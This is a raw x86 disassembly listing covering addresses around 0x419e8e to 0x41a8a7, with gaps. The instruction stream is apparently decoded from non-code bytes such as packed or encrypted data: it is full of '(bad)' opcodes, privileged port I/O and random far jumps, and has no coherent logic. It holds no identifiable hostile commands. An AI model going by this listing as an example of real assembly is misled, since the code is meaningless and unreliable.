  419e8e:	sbb    DWORD PTR [ecx+0x2e4fa01b],ebx
  419e94:	leave  
  419e95:	sub    eax,0xeac2b89b
  419e9a:	cmp    DWORD PTR [ebx],0xc5ab3045
  419ea0:	imul   edi,DWORD PTR [ebp-0xac7ce20],0xffffff90
  419ea7:	sub    dh,BYTE PTR [eax+0x54]
  419eaa:	sub    eax,DWORD PTR [ecx]
  419eac:	or     eax,0xffffffee
  419eaf:	mov    DWORD PTR [edx-0x6b4bbedd],eax
  419eb5:	push   0xdbc00c97
  419eba:	test   eax,0x9165c60d
  419ebf:	lahf   
  419ec0:	pop    edi
  419ec1:	inc    eax
  419ec2:	pop    edi
  419ec3:	mov    esi,DWORD PTR fs:[ebx+0x37f0bc41]
  419eca:	mov    dl,BYTE PTR [ebx-0x1]
  419ecd:	inc    esi
  419ece:	mov    eax,ds:0xc160b2cd
  419ed3:	sbb    cl,ah
  419ed5:	psraw  mm5,mm4
  419ed8:	xor    cl,BYTE PTR [eax+0x7]
  419edb:	xor    ah,dh
  419edd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ede:	and    edi,DWORD PTR [edi-0x2a]
  419ee1:	aas    
  419ee2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ee4:	ret    0x9c0d
  419ee7:	mov    esi,DWORD PTR [esi+0x47]
  419eea:	cmp    bl,BYTE PTR [ebx]
  419eec:	sbb    eax,0x0
	...
  419f55:	add    BYTE PTR [edi+0x5fc517d8],al
  419f5b:	iret   
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419f61:	inc    esi
  419f62:	repz sub al,0xd1
  419f65:	pop    es
  419f66:	daa    
  419f67:	pop    ss
  419f68:	add    DWORD PTR [eax],eax
  419f6a:	inc    DWORD PTR [eax]
  419f6c:	add    BYTE PTR [eax],al
  419f6e:	sub    eax,0x67b1f759
  419f73:	(bad)  
  419f75:	clc    
  419f76:	mov    ebx,0xe0889cff
  419f7b:	enter  0x7ab0,0x51
  419f7f:	sub    BYTE PTR [eax+0x7b],al
  419f82:	fbstp  TBYTE PTR gs:[edx+0x11ea3eed]
  419f89:	jge    0x419f6f
  419f8b:	fst    DWORD PTR [eax+0x5001ed76]
  419f91:	mov    bl,0x16
  419f93:	xchg   esi,eax
  419f94:	adc    edx,edx
  419f96:	jnp    0x419fc1
  419f98:	xchg   edx,eax
  419f99:	cmp    BYTE PTR [ebx+ebx*8+0x5dabd278],bh
  419fa0:	clc    
  419fa1:	int3   
  419fa2:	loop   0x419fa2
  419fa4:	jnp    0x419fca
  419fa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fa7:	popa   
  419fa8:	les    edx,FWORD PTR [ebx-0x8e2eb49]
  419fae:	adc    BYTE PTR [eax-0x2d8d809b],dl
  419fb4:	out    0x37,eax
  419fb6:	jg     0x41a01a
  419fb8:	and    DWORD PTR [ecx-0x2783eb1d],ebp
  419fbe:	clc    
  419fbf:	mov    edx,?
  419fc1:	daa    
  419fc2:	imul   ecx,DWORD PTR [esi+ebp*2],0xffffff83
  419fc6:	sbb    eax,0x3d70008a
  419fcb:	mov    ch,0x6f
  419fcd:	dec    ebx
  419fce:	outs   dx,BYTE PTR ds:[esi]
  419fcf:	pushf  
  419fd0:	loopne 0x41a044
  419fd2:	xchg   edi,eax
  419fd3:	(bad)  
  419fd4:	adc    edx,0xffffffbe
  419fd7:	cmp    esp,DWORD PTR [edx-0x29f19389]
  419fdd:	mov    al,ds:0x1d70b41f
  419fe2:	popa   
  419fe3:	jne    0x419f6c
  419fe5:	and    eax,0x470bd7
  419fea:	stos   DWORD PTR es:[edi],eax
  419feb:	and    edi,DWORD PTR [ecx+ecx*1+0x16466ef5]
  419ff2:	scas   eax,DWORD PTR es:[edi]
  419ff3:	and    edi,DWORD PTR [esi+0x4877a0b3]
  419ff9:	imul   BYTE PTR [edx+ecx*8-0x6fead916]
  41a000:	mov    al,ds:0xd4c192a8
  41a005:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a006:	add    eax,0xe190f733
  41a00b:	pusha  
  41a00c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a00d:	cli    
  41a00e:	pop    eax
  41a00f:	or     al,0xd9
  41a011:	cmc    
  41a012:	imul   dh
  41a014:	retf   
  41a015:	dec    eax
  41a016:	mov    ah,0x4
  41a018:	xchg   esi,edx
  41a01a:	push   esp
  41a01b:	pop    ecx
  41a01c:	mov    bh,0x74
  41a01e:	mov    bl,0xc2
  41a020:	jecxz  0x41a06f
  41a022:	cmp    eax,0x10ae6a17
  41a027:	inc    ebx
  41a028:	mov    eax,ds:0x5e3a22ac
  41a02d:	stc    
  41a02e:	sub    BYTE PTR ds:0x2f9e756c,al
  41a034:	dec    ecx
  41a035:	sbb    al,0x17
  41a037:	push   esi
  41a038:	sbb    eax,0x6de51e8a
  41a03d:	imul   ecx,ecx,0x18dca05d
  41a043:	jmp    0x41a004
  41a045:	fidiv  DWORD PTR [esi]
  41a047:	mov    eax,ds:0xd5e54bb9
  41a04c:	pop    ebx
  41a04d:	mov    dh,bh
  41a04f:	(bad)  
  41a050:	lock sbb bh,0xaf
  41a054:	sbb    al,bh
  41a056:	retf   
  41a057:	lock pop ss
  41a059:	jno    0x41a003
  41a05b:	sti    
  41a05c:	fwait
  41a05d:	sub    ebp,DWORD PTR [ebx]
  41a05f:	dec    ecx
  41a060:	mov    esi,0x9670d173
  41a065:	shl    DWORD PTR [eax+0x1c],cl
  41a068:	mov    eax,ds:0x6af0305a
	...
  41a0d5:	add    BYTE PTR [esi-0x15],cl
  41a0d8:	sub    cl,BYTE PTR [esi-0x51]
  41a0db:	iret   
  41a0dc:	outs   dx,BYTE PTR ds:[esi]
  41a0dd:	jmp    0x41a062
  41a0df:	push   edx
  41a0e0:	test   BYTE PTR [eax+0x7],bh
  41a0e3:	and    ecx,DWORD PTR [esi+0x60]
  41a0e6:	sbb    BYTE PTR es:[ecx],al
  41a0e9:	add    bh,bh
  41a0eb:	add    BYTE PTR [eax],al
  41a0ed:	add    al,bh
  41a0ef:	mov    dh,0x7
  41a0f1:	xchg   edi,eax
  41a0f2:	aam    0x3a
  41a0f4:	jbe    0x41a079
  41a0f6:	mov    ebp,0x1bd0029a
  41a0fb:	in     eax,dx
  41a0fc:	data16 in al,dx
  41a0fe:	or     al,0x29
  41a100:	shl    BYTE PTR [ecx],cl
  41a102:	lock cmp eax,0x8cd77655
  41a108:	jmp    0x41a0db
  41a10a:	xlat   BYTE PTR ds:[ebx]
  41a10b:	mov    bl,0x21
  41a10d:	imul   ebx,DWORD PTR [ebx+0x5f],0xfa9b8590
  41a114:	pop    edx
  41a115:	das    
  41a116:	sbb    al,BYTE PTR [edx+0x64]
  41a119:	fld    DWORD PTR [edx+0x52]
  41a11c:	aam    0xd4
  41a11e:	cwde   
  41a11f:	mov    eax,0x5ca61c87
  41a124:	mov    esp,0xf399a01b
  41a129:	dec    ebx
  41a12a:	fcom   DWORD PTR [ebx+esi*1-0x5b]
  41a12e:	out    dx,eax
  41a12f:	idiv   DWORD PTR [eax]
  41a131:	out    0x2d,al
  41a133:	fld    QWORD PTR [esi+eiz*1-0x79772f0b]
  41a13a:	xchg   esp,eax
  41a13b:	int    0x5c
  41a13d:	idiv   dh
  41a13f:	ja     0x41a15e
  41a141:	ret    0x3fb7
  41a144:	inc    eax
  41a145:	ins    BYTE PTR es:[edi],dx
  41a146:	or     eax,0xb120edc5
  41a14b:	pop    edi
  41a14c:	push   edi
  41a14d:	or     bh,dl
  41a14f:	rol    BYTE PTR [esi+0x60f90d28],0x1c
  41a156:	(bad)  
  41a157:	addr16 xchg esi,eax
  41a159:	pop    es
  41a15a:	jge    0x41a0ec
  41a15c:	push   edx
  41a15d:	bound  eax,QWORD PTR [ecx-0x45]
  41a160:	mov    ebp,DWORD PTR [esi]
  41a162:	lods   eax,DWORD PTR ds:[esi]
  41a163:	push   edx
  41a164:	pop    edx
  41a165:	pop    ebp
  41a166:	jmp    0x4c33f396
  41a16b:	inc    edx
  41a16c:	into   
  41a16d:	hlt    
  41a16e:	mov    WORD PTR [edx+ecx*1+0x6ea9d992],?
  41a175:	or     al,0xa
  41a177:	ds and ebx,0x38
  41a17b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a17c:	lock sub dh,0xcb
  41a180:	sub    al,0x61
  41a182:	in     al,dx
  41a183:	inc    ebp
  41a184:	ds pop ss
  41a186:	adc    al,0x98
  41a188:	out    0xe1,al
  41a18a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a18b:	xchg   edi,eax
  41a18c:	inc    ebx
  41a18d:	mov    DWORD PTR [ecx+0x5dcd0b85],esi
  41a193:	pop    ebp
  41a194:	dec    esi
  41a195:	ds mov bl,0xf8
  41a198:	out    0xdd,eax
  41a19a:	xor    esp,edx
  41a19c:	ret    
  41a19d:	test   bh,0xd7
  41a1a0:	retf   
  41a1a1:	xchg   edx,eax
  41a1a2:	jns    0x41a1c7
  41a1a4:	jo     0x41a18b
  41a1a6:	mov    eax,ecx
  41a1a8:	jns    0x41a148
  41a1aa:	scas   al,BYTE PTR es:[edi]
  41a1ab:	mov    eax,0x7205b4bd
  41a1b0:	jle    0x41a223
  41a1b2:	aaa    
  41a1b3:	sbb    BYTE PTR [edx+0x45],dl
  41a1b6:	mov    al,ds:0x16052f3a
  41a1bb:	push   ebx
  41a1bc:	lods   al,BYTE PTR fs:[esi]
  41a1be:	cmp    dh,BYTE PTR [ecx+0x4c]
  41a1c1:	(bad)  
  41a1c2:	or     al,0x5c
  41a1c4:	push   cs
  41a1c5:	loop   0x41a1fc
  41a1c7:	pop    ebx
  41a1c8:	clc    
  41a1c9:	pop    ebp
  41a1ca:	ins    DWORD PTR es:[edi],dx
  41a1cb:	or     DWORD PTR [ecx+0x6e066240],0x629e5585
  41a1d5:	hlt    
  41a1d6:	push   ss
  41a1d7:	(bad)  
  41a1d8:	push   ds
  41a1d9:	shl    dh,cl
  41a1db:	mov    eax,0x49f63221
  41a1e0:	xchg   edx,eax
  41a1e1:	push   0xbf3f3246
  41a1e6:	sub    BYTE PTR [eax+0x76],bh
  41a1e9:	xor    eax,0xbab258
	...
  41a256:	sbb    al,0xc
  41a258:	std    
  41a259:	sbb    ebp,edi
  41a25b:	stc    
  41a25c:	cld    
  41a25d:	or     eax,0x398d6850
  41a262:	in     eax,0xb0
  41a264:	mov    ebx,0x1192595
  41a269:	add    bh,bh
  41a26b:	add    BYTE PTR [eax],al
  41a26d:	add    bh,dh
  41a26f:	pop    eax
  41a270:	ja     0x41a208
  41a272:	add    al,0xc9
  41a274:	std    
  41a275:	push   ecx
  41a276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a277:	shl    DWORD PTR [ebp+0x5c93a52a],1
  41a27d:	sbb    BYTE PTR [eax-0x324c6c47],0x5e
  41a284:	sub    BYTE PTR [eax],dl
  41a286:	fidiv  DWORD PTR [edi+0x2df854ff]
  41a28c:	jo     0x41a285
  41a28e:	xchg   esi,eax
  41a28f:	(bad)  
  41a290:	outs   dx,DWORD PTR ds:[esi]
  41a291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a292:	arpl   cx,dx
  41a294:	sahf   
  41a295:	inc    eax
  41a296:	push   0x6c
  41a298:	test   eax,0x286dba7e
  41a29d:	fwait
  41a29e:	sbb    eax,0xbed18eb4
  41a2a3:	xor    ebx,DWORD PTR [edx]
  41a2a5:	test   eax,0xf2c46f3f
  41a2aa:	mov    WORD PTR [edx+eiz*2+0x3eb0368d],?
  41a2b1:	arpl   WORD PTR [ebx+ebx*4+0x7919e0ad],sp
  41a2b8:	cli    
  41a2b9:	fld    DWORD PTR [edi+0x5e]
  41a2bc:	jns    0x41a28d
  41a2be:	nop
  41a2bf:	jge    0x41a2e6
  41a2c1:	movq   QWORD PTR [ecx],mm5
  41a2c4:	retf   
  41a2c5:	mov    bl,0xef
  41a2c7:	(bad)
  41a2cb:	xor    DWORD PTR [edx+0x6341c321],eax
  41a2d1:	or     DWORD PTR [edx-0x56],ecx
  41a2d4:	mov    edx,0xdc85ae68
  41a2d9:	mov    cl,0x12
  41a2db:	mov    al,BYTE PTR [ebx+0x1]
  41a2de:	rcr    DWORD PTR [eax],0x5e
  41a2e1:	rep ins BYTE PTR es:[edi],dx
  41a2e3:	add    ecx,ebp
  41a2e5:	or     BYTE PTR [edx],ch
  41a2e7:	mov    dl,0xe3
  41a2e9:	pop    es
  41a2ea:	in     eax,dx
  41a2eb:	cs ss add edx,ecx
  41a2ef:	dec    ebp
  41a2f0:	rcl    DWORD PTR [edx+0x7b71301d],1
  41a2f6:	pop    es
  41a2f7:	mov    es,WORD PTR [ecx+0x5d]
  41a2fa:	jae    0x41a2d7
  41a2fc:	mov    ch,0x70
  41a2fe:	popa   
  41a2ff:	inc    ebx
  41a300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a301:	aam    0xe
  41a303:	test   dh,bh
  41a305:	push   eax
  41a306:	jmp    FWORD PTR ds:0x9b5b7ab5
  41a30c:	pop    ds
  41a30d:	fild   DWORD PTR [ebx+0x61]
  41a310:	dec    ebx
  41a311:	mov    edx,0xbb7a52fd
  41a316:	in     al,0xd7
  41a318:	sub    BYTE PTR [ecx+0x20],0x5b
  41a31c:	mov    esi,0x5808671c
  41a321:	cs push ebp
  41a323:	dec    edi
  41a324:	mov    bh,0xc6
  41a326:	inc    esi
  41a327:	test   eax,0x5b00b5bb
  41a32c:	pop    ss
  41a32d:	pop    edx
  41a32e:	mov    cl,0xef
  41a330:	add    ebx,DWORD PTR [esi]
  41a332:	jns    0x41a358
  41a334:	fwait
  41a335:	and    BYTE PTR [ecx+0x5ccae32c],cl
  41a33b:	jmp    0xe5d8:0x3c8b372
  41a342:	jle    0x41a2e5
  41a344:	and    edx,DWORD PTR [esp+ecx*4-0x28]
  41a348:	or     BYTE PTR [ebx-0x14],ch
  41a34b:	xor    al,0x6
  41a34d:	inc    ebp
  41a34e:	dec    esp
  41a34f:	jecxz  0x41a384
  41a351:	mov    ?,WORD PTR [ebx-0x38dc579d]
  41a357:	push   edi
  41a358:	popf   
  41a359:	bound  esp,QWORD PTR [eax+0x28f653a3]
  41a35f:	das    
  41a360:	xchg   ebp,eax
  41a361:	not    DWORD PTR [esp+eax*2+0x9c48d03]
  41a368:	jle    0x41a2f8
  41a36a:	aaa    
  41a36b:	sbb    al,0xaa
	...
  41a3d5:	add    bh,dh
  41a3d7:	pop    eax
  41a3d8:	test   al,0x13
  41a3da:	scas   eax,DWORD PTR es:[edi]
  41a3db:	repz (bad) 
  41a3dd:	cld    
  41a3de:	adc    eax,0xf0a6955c
  41a3e3:	push   0x1
  41a3e5:	frstor [edx+ebx*1]
  41a3e8:	add    DWORD PTR [eax],eax
  41a3ea:	inc    DWORD PTR [eax]
  41a3ec:	add    BYTE PTR [eax],al
  41a3ee:	cld    
  41a3ef:	adc    eax,0xa27ebb22
  41a3f4:	addr16 push edi
  41a3f6:	fs jg  0x41a3d9
  41a3f9:	inc    ecx
  41a3fa:	mov    ebp,0x9287cfde
  41a3ff:	dec    edi
  41a400:	or     esp,DWORD PTR [eax+eiz*1-0x1f]
  41a404:	pop    ss
  41a405:	xchg   ebp,eax
  41a406:	lea    edx,[eax+0x6e]
  41a409:	in     eax,dx
  41a40a:	jbe    0x41a3e4
  41a40c:	sbb    BYTE PTR ds:0x132da856,bh
  41a412:	mov    al,ds:0x303bd2eb
  41a417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a418:	sbb    dl,BYTE PTR [esi-0x217e2b52]
  41a41e:	loopne 0x41a3f6
  41a420:	xor    al,0xac
  41a422:	fcom   QWORD PTR [ebx]
  41a424:	enter  0x19b9,0x30
  41a428:	fdiv   QWORD PTR [ebx]
  41a42a:	repnz xor BYTE PTR [edi-0xb53d3fc],ch
  41a431:	jno    0x41a423
  41a433:	xchg   BYTE PTR [edi+ebx*2+0x76],cl
  41a437:	xchg   esi,eax
  41a438:	gs mov ch,0xa2
  41a43b:	push   es
  41a43c:	jnp    0x41a438
  41a43e:	aas    
  41a43f:	add    esp,DWORD PTR [eax-0x1e]
  41a442:	add    ebx,ebp
  41a444:	out    dx,eax
  41a445:	aas    
  41a446:	xchg   esi,eax
  41a447:	adc    ebp,ecx
  41a449:	sub    eax,edi
  41a44b:	sbb    eax,0x6958238f
  41a450:	xor    al,0x45
  41a452:	sbb    ecx,0xffffffa1
  41a455:	test   eax,0xe235f0f1
  41a45a:	add    BYTE PTR [edi],cl
  41a45c:	stos   BYTE PTR es:[edi],al
  41a45d:	cmp    al,0x3d
  41a45f:	mov    ecx,DWORD PTR [esi-0x30a67239]
  41a465:	push   ebx
  41a466:	dec    esi
  41a467:	mov    ah,BYTE PTR [ebp-0x21]
  41a46a:	push   eax
  41a46b:	inc    eax
  41a46c:	popa   
  41a46d:	daa    
  41a46e:	push   es
  41a46f:	dec    BYTE PTR [eax]
  41a471:	stos   BYTE PTR es:[edi],al
  41a472:	stos   DWORD PTR es:[edi],eax
  41a473:	test   al,0x49
  41a475:	sbb    edx,DWORD PTR [ebp+0x23bb9d4a]
  41a47b:	xor    ecx,0x17ac1d66
  41a481:	dec    ecx
  41a482:	lods   eax,DWORD PTR ds:[esi]
  41a483:	sbb    ecx,0x60376e29
  41a489:	sub    ebp,ecx
  41a48b:	mov    bh,0x5e
  41a48d:	push   eax
  41a48e:	push   edx
  41a48f:	xor    al,0x82
  41a491:	sbb    al,0x1
  41a493:	jne    0x41a4c3
  41a495:	xchg   BYTE PTR [esi],bl
  41a497:	test   eax,0x2b9e898
  41a49c:	mov    al,ds:0xf363d3b4
  41a4a1:	mov    dl,0x15
  41a4a3:	popf   
  41a4a4:	sbb    esp,ecx
  41a4a6:	jno    0x41a4ca
  41a4a8:	test   al,0x28
  41a4aa:	inc    ecx
  41a4ab:	das    
  41a4ac:	in     al,0x9b
  41a4ae:	outs   dx,BYTE PTR ds:[esi]
  41a4af:	mul    BYTE PTR [esp+eax*2]
  41a4b2:	js     0x41a51f
  41a4b4:	push   ebp
  41a4b5:	popa   
  41a4b6:	lahf   
  41a4b7:	push   ebx
  41a4b8:	call   0x432d2138
  41a4bd:	mov    al,0xf5
  41a4bf:	push   cs
  41a4c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4c1:	in     eax,0xcd
  41a4c3:	adc    eax,edx
  41a4c5:	cmp    bl,BYTE PTR [ebx+eiz*2-0x48]
  41a4c9:	lea    ecx,[ebx]
  41a4cb:	pusha  
  41a4cc:	mov    ?,WORD PTR [ecx+0x32]
  41a4cf:	and    BYTE PTR [ecx-0x2c8cca29],cl
  41a4d5:	neg    DWORD PTR ds:0x975a4e67
  41a4db:	(bad)  
  41a4dc:	cs (bad) 
  41a4de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4df:	pushf  
  41a4e0:	sub    al,0xda
  41a4e2:	pop    ss
  41a4e3:	sti    
  41a4e4:	scas   al,BYTE PTR es:[edi]
  41a4e5:	leave  
  41a4e6:	adc    al,0xf
  41a4e8:	mov    fs:0x3cd02d,al
	...
  41a556:	mov    edi,0xff0fcf82
  41a55b:	dec    edi
  41a55c:	push   DWORD PTR [edx+0x5f4d0d09]
  41a562:	pop    DWORD PTR [ecx+0x1b23c691]
  41a568:	add    DWORD PTR [eax],eax
  41a56a:	inc    DWORD PTR [eax]
  41a56c:	add    BYTE PTR [eax],al
  41a56e:	call   0xca9450cf
  41a573:	dec    ecx
  41a574:	lock fiadd DWORD PTR [eax-0x30]
  41a578:	ins    BYTE PTR es:[edi],dx
  41a579:	add    al,BYTE PTR [edx]
  41a57b:	adc    ecx,esp
  41a57d:	push   cs
  41a57e:	stc    
  41a57f:	loopne 0x41a5f8
  41a581:	mov    WORD PTR [esi+0x8],cs
  41a584:	dec    ecx
  41a585:	sbb    BYTE PTR [edi+eax*2],cl
  41a588:	sti    
  41a589:	xor    al,0xf5
  41a58b:	cmp    BYTE PTR [ebp+0x7492d7dd],dl
  41a591:	(bad)  
  41a592:	imul   ebx,ecx,0xffffffc9
  41a595:	inc    ebx
  41a596:	out    0xa,al
  41a598:	push   edx
  41a599:	stc    
  41a59a:	jge    0x41a599
  41a59c:	in     eax,dx
  41a59d:	pavgb  mm4,mm5
  41a5a0:	jmp    0xff72:0x46a5d6a1
  41a5a7:	and    DWORD PTR [edx],ebx
  41a5a9:	push   ebx
  41a5aa:	arpl   si,cx
  41a5ac:	sbb    DWORD PTR [esi+0x4a7524b8],ebp
  41a5b2:	push   ecx
  41a5b3:	push   esp
  41a5b4:	mov    DWORD PTR [ecx-0x71],ebx
  41a5b7:	add    eax,0x47c1b4db
  41a5bc:	push   ds
  41a5bd:	das    
  41a5be:	dec    eax
  41a5bf:	mov    cl,0x8a
  41a5c1:	xchg   ebx,eax
  41a5c2:	adc    ebp,DWORD PTR [ebp-0x5a]
  41a5c5:	ret    0x4b51
  41a5c8:	inc    edi
  41a5c9:	aam    0xb8
  41a5cb:	cmp    bl,al
  41a5cd:	sahf   
  41a5ce:	retf   0x95ee
  41a5d1:	mov    eax,0x53d85c59
  41a5d6:	mov    bh,0x1f
  41a5d8:	(bad)  
  41a5d9:	sub    eax,0xb5c08200
  41a5de:	push   ecx
  41a5df:	push   cs
  41a5e0:	addr16 pop ebx
  41a5e2:	push   eax
  41a5e3:	inc    ebx
  41a5e4:	dec    ebp
  41a5e5:	jp     0x41a632
  41a5e7:	imul   ebx,DWORD PTR [ecx-0x604e202b],0x6f2b3a5b
  41a5f1:	mov    WORD PTR [edx+0x4d7d8a66],gs
  41a5f7:	daa    
  41a5f8:	mov    ebx,0x5a3fb19a
  41a5fd:	add    al,0x73
  41a5ff:	add    ch,BYTE PTR [edi]
  41a601:	mov    al,0xbb
  41a603:	ror    DWORD PTR [ebp+eiz*2+0x68],1
  41a607:	(bad)
  41a60a:	sahf   
  41a60b:	fdiv   DWORD PTR [ebx]
  41a60d:	sub    DWORD PTR [esi-0x62ea4146],ebp
  41a613:	popa   
  41a614:	mov    BYTE PTR [esi-0x478f1044],cl
  41a61a:	push   cs
  41a61b:	test   BYTE PTR ds:0xf656938e,0x2c
  41a622:	pop    esp
  41a623:	bound  ebx,QWORD PTR [edx-0x41]
  41a626:	loop   0x41a67d
  41a628:	inc    esi
  41a629:	pop    esp
  41a62a:	jmp    0x41a5f7
  41a62c:	cli    
  41a62d:	shl    DWORD PTR [edx-0x38],cl
  41a630:	scas   eax,DWORD PTR es:[edi]
  41a631:	icebp  
  41a632:	lods   al,BYTE PTR ds:[esi]
  41a633:	push   edx
  41a634:	ins    DWORD PTR es:[edi],dx
  41a635:	lea    ebp,[eax+0x2cfc0d31]
  41a63b:	and    DWORD PTR [ebp-0x5],edi
  41a63e:	push   cs
  41a63f:	pop    ss
  41a640:	dec    edi
  41a641:	popf   
  41a642:	(bad)  
  41a643:	pop    ss
  41a644:	adc    ebp,DWORD PTR [edi-0x7ebb1d9]
  41a64a:	or     eax,DWORD PTR [edi-0x2e84ac3f]
  41a650:	adc    esp,0x1081f670
  41a656:	shr    DWORD PTR [edi-0x3d803b39],cl
  41a65c:	push   0x2c
  41a65e:	jmp    0x4169:0xefb1a2a3
  41a665:	in     al,dx
  41a666:	retf   
  41a667:	mov    ebx,ecx
  41a669:	jge    0x41a663
  41a66b:	mov    dl,0x32
	...
  41a6d5:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a6d9:	inc    ecx
  41a6da:	ja     0x41a747
  41a6dc:	pop    esp
  41a6dd:	aas    
  41a6de:	dec    ecx
  41a6df:	push   0x315a625
  41a6e4:	mov    ?,WORD PTR [edi]
  41a6e6:	and    bl,BYTE PTR [ecx+eax*1]
  41a6e9:	add    bh,bh
  41a6eb:	add    BYTE PTR [eax],al
  41a6ed:	add    BYTE PTR [esi+0x57],dl
  41a6f0:	dec    ebx
  41a6f1:	sbb    al,0x3d
  41a6f3:	test   BYTE PTR [ecx-0x1],cl
  41a6f6:	icebp  
  41a6f7:	sub    DWORD PTR [eax],0x21f858c8
  41a6fd:	sbb    DWORD PTR [ebx+0x13],0xdc6ba946
  41a704:	out    dx,al
  41a705:	mov    al,0x2
  41a707:	inc    edi
  41a708:	psubusb mm6,mm2
  41a70b:	test   BYTE PTR [edx-0x65],dh
  41a70e:	in     eax,0x7c
  41a710:	rcr    DWORD PTR [esp],1
  41a713:	xchg   ebp,eax
  41a714:	int    0xff
  41a716:	sub    edx,DWORD PTR [ebp+0x47a9890d]
  41a71c:	jge    0x41a6de
  41a71e:	mov    bh,0x4d
  41a720:	or     ch,BYTE PTR [ebx+0x5f30cfa7]
  41a726:	mov    ds:0x3a5c03a,eax
  41a72b:	dec    edx
  41a72c:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a72e:	push   0x5bca9a35
  41a733:	sbb    BYTE PTR [edx+eax*1+0x74e620c2],0xe4
  41a73b:	inc    edi
  41a73c:	jg     0x41a778
  41a73e:	imul   esi,ebx,0xffffff86
  41a741:	push   0xffffff99
  41a743:	cld    
  41a744:	and    BYTE PTR [ebp+0xb],al
  41a747:	push   ss
  41a748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a749:	mov    fs,WORD PTR es:[esp+esi*2]
  41a74d:	and    dl,dl
  41a74f:	shl    DWORD PTR [edi-0x1cf72c0b],cl
  41a755:	pop    ss
  41a756:	cdq    
  41a757:	aas    
  41a758:	xchg   esi,eax
  41a759:	fist   DWORD PTR [edx+0x6]
  41a75c:	aaa    
  41a75d:	scas   al,BYTE PTR es:[edi]
  41a75e:	into   
  41a75f:	mov    edi,eax
  41a761:	enter  0x8fc8,0x9b
  41a765:	sub    DWORD PTR [esp+edx*2+0x3d794279],0x2c
  41a76d:	enter  0xc67e,0xda
  41a771:	stos   BYTE PTR es:[edi],al
  41a772:	mov    ebp,0xf5ce6c8c
  41a777:	fdiv   DWORD PTR [eax]
  41a779:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a77a:	rcr    ebp,cl
  41a77c:	repz loop 0x41a7ad
  41a77f:	lods   eax,DWORD PTR ds:[esi]
  41a780:	ret    
  41a781:	jg     0x41a801
  41a783:	inc    ebp
  41a784:	mov    dl,0x43
  41a786:	jge    0x41a7b3
  41a788:	push   esp
  41a789:	xchg   DWORD PTR [eax],eax
  41a78b:	dec    esi
  41a78c:	loop   0x41a801
  41a78e:	mov    ebp,0x8e3fc03
  41a793:	fyl2xp1 
  41a795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a796:	(bad)  
  41a797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a798:	imul   esp
  41a79a:	mov    ecx,DWORD PTR [eax+esi*2-0x51dc3cfe]
  41a7a1:	push   cs
  41a7a2:	fdivp  st(6),st
  41a7a4:	(bad)  
  41a7a5:	push   ebx
  41a7a6:	xchg   edi,eax
  41a7a7:	lahf   
  41a7a8:	dec    esi
  41a7a9:	xchg   esi,eax
  41a7aa:	pushf  
  41a7ab:	mov    ebp,0x2954a505
  41a7b0:	cmp    eax,0xe43c82f4
  41a7b5:	cwde   
  41a7b6:	pop    ss
  41a7b7:	lods   al,BYTE PTR ds:[esi]
  41a7b8:	sbb    ah,bl
  41a7ba:	div    ebp
  41a7bc:	sbb    DWORD PTR [bp+si+0x2b],esp
  41a7c0:	mov    al,cl
  41a7c2:	nop
  41a7c3:	push   cs
  41a7c4:	pop    edi
  41a7c5:	inc    esi
  41a7c6:	pop    edx
  41a7c7:	jge    0x41a797
  41a7c9:	inc    eax
  41a7ca:	add    ebp,eax
  41a7cc:	fwait
  41a7cd:	or     eax,0xdfb47777
  41a7d2:	jo     0x41a82a
  41a7d4:	mov    ds:0x994def49,eax
  41a7d9:	dec    ebp
  41a7da:	ret    0x9613
  41a7dd:	and    DWORD PTR [edx+0x4d],edi
  41a7e0:	inc    ebx
  41a7e1:	and    BYTE PTR [eax+0x1d6109bb],bl
  41a7e7:	iret   
  41a7e8:	jo     0x41a849
  41a7ea:	int    0xd3
  41a7ec:	mov    ecx,0x0
	...
  41a855:	add    bl,dh
  41a857:	xchg   edi,eax
  41a858:	jae    0x41a7e1
  41a85a:	ja     0x41a843
  41a85c:	div    edi
  41a85e:	mov    ds:0xd65327ca,al
  41a863:	aas    
  41a864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a865:	pop    ds
  41a866:	and    DWORD PTR ds:0xff0001,ebx
  41a86c:	add    BYTE PTR [eax],al
  41a86e:	or     eax,0x7890a3ca
  41a873:	sub    al,0x5c
  41a875:	test   BYTE PTR [edx],bh
  41a877:	xchg   ebx,eax
  41a878:	das    
  41a879:	jg     0x41a858
  41a87b:	in     al,0xc3
  41a87d:	mov    edx,0xd1a51541
  41a882:	lods   eax,DWORD PTR ds:[esi]
  41a883:	icebp  
  41a884:	stos   DWORD PTR es:[edi],eax
  41a885:	out    0xcf,al
  41a887:	rcr    BYTE PTR [ebp-0x18],0x1f
  41a88b:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41a88d:	test   al,0x8f
  41a88f:	xchg   ecx,eax
  41a890:	and    eax,0x5b380a24
  41a895:	out    dx,eax
  41a896:	xchg   ebp,eax
  41a897:	mov    ss,WORD PTR [esi-0x4d]
  41a89a:	and    eax,0xab1b576b
  41a89f:	inc    esp
  41a8a0:	mov    BYTE PTR [eax+edx*4-0x633721c6],bh
  41a8a7:	(bad)  
